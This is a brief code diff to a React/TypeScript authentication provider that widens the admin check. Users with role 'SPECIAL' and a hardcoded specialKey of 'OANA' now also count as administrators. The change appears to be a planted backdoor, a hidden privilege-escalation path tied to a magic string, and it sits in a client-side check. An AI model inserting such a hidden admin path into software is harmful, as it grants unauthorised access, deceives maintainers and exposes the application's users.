@@ -105,7 +105,9 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   const user = data?.user ?? null;
   const isAuthenticated = !!user;
-  const isAdmin = user?.role === "ADMIN";
+  const isAdmin =
+    user?.role === "ADMIN" ||
+    (user?.role === "SPECIAL" && user?.specialKey === "OANA");
   const isAgent = user?.role === "AGENT";
 
   const hasPermission = (permission: string): boolean => {
